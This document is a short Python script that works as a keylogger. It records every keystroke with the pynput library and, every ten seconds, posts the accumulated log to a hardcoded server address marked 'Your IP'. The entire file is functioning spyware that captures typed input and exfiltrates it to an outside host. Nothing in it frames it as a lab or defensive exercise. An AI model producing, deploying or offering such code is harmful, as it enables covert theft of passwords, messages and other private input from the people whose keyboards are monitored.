import requests
from pynput import keyboard
import threading

log = ""
server_url = "http://172.16.220.28:5000/receive"  # Your IP

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f"[{key}]"

def send_logs():
    global log
    print("Sending log:", log)  # Add this
    try:
        requests.post(server_url, data={"log": log})
    except Exception as e:
        print("Error sending:", e)
    log = ""
    threading.Timer(10, send_logs).start()

keyboard_listener = keyboard.Listener(on_press=on_press)
with keyboard_listener:
    send_logs()
    keyboard_listener.join()